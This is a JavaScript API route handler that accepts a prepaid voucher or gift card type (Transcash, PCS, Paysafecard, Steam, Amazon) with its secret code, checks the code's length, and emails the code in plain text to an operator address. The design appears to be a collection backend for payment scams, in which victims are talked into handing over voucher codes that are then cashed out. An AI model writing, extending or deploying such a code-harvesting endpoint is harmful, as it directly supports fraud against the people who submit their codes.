import nodemailer from 'nodemailer';

const cardTypeRequirements = {
  transcash: 12,
  pcs: 10,
  paysafecard: 16,
  steam: 15,
  amazon: 15,
};

let transport;
function getTransport() {
  if (!transport) {
    transport = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT || 587),
      secure: process.env.SMTP_SECURE === 'true',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });
  }
  return transport;
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    const { cardType, securityText } = req.body;

    const expectedLength = cardTypeRequirements[cardType];
    if (!cardType || !securityText || !expectedLength || securityText.length !== expectedLength) {
      res.status(400).json({ error: 'Invalid payload' });
      return;
    }

    const emailTo = process.env.COMPANY_EMAIL;
    if (!emailTo) {
      res.status(500).json({ error: 'Missing COMPANY_EMAIL configuration' });
      return;
    }

    const mailResult = await getTransport().sendMail({
      from: process.env.SMTP_FROM || emailTo,
      to: emailTo,
      subject: `Gift card security text received: ${cardType}`,
      text: `Gift card type: ${cardType}\nSecurity text: ${securityText}`,
    });

    res.status(200).json({ ok: true, info: mailResult });
  } catch (error) {
    console.error('sendSecurityText error:', error);
    res.status(500).json({ error: 'Failed to send email' });
  }
}
